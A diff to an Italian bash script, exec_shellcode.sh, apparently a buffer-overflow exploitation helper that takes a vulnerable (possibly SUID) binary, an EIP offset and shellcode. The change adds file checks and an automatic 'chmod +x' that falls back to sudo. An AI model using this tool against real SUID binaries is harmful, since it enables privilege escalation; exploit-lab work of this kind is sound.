@@ -25,7 +25,8 @@ SYNOPSIS
     ./exec_shellcode.sh [OPZIONI]        # chiede i parametri mancanti a video
 
 ARGOMENTI POSIZIONALI (opzionali: se ne ometti uno, te lo chiede a video)
-    ./binario    Il binario vulnerabile (SUID o no).
+    ./binario    Il binario vulnerabile (SUID o no). Se non ha il permesso di
+                 esecuzione, lo script glielo assegna con 'chmod +x'.
     OFFSET       Byte di padding prima dell'indirizzo di ritorno (es. 112).
                  E' l'offset EIP, quello stampato da offset_finder.sh.
     SHELLCODE    Lo shellcode. Due formati accettati, riconosciuti da solo:
@@ -157,8 +158,25 @@ else
 fi
 
 # --------------------------- Validazioni -----------------------------------
+# Verifica che il binario esista e sia eseguibile; se non lo e', lo rende tale.
+if [ ! -e "$BINARY" ]; then
+	echo "[-] '$BINARY' non esiste."; exit 1
+fi
+if [ ! -f "$BINARY" ]; then
+	echo "[-] '$BINARY' non e' un file regolare."; exit 1
+fi
 if [ ! -x "$BINARY" ]; then
-	echo "[-] '$BINARY' non esiste o non e' eseguibile."; exit 1
+	echo "[*] '$BINARY' non ha il permesso di esecuzione: lo imposto con 'chmod +x'..."
+	if chmod +x "$BINARY" 2>/dev/null; then
+		echo "[+] Permesso di esecuzione impostato su '$BINARY'."
+	else
+		echo "[!] chmod senza privilegi fallito: riprovo con sudo..."
+		if sudo chmod +x "$BINARY"; then
+			echo "[+] Permesso di esecuzione impostato (via sudo) su '$BINARY'."
+		else
+			echo "[-] 'chmod +x' su '$BINARY' fallito anche con sudo."; exit 1
+		fi
+	fi
 fi
 if ! [[ "$OFFSET" =~ ^[0-9]+$ ]]; then
 	echo "[-] OFFSET deve essere un numero intero."; exit 1
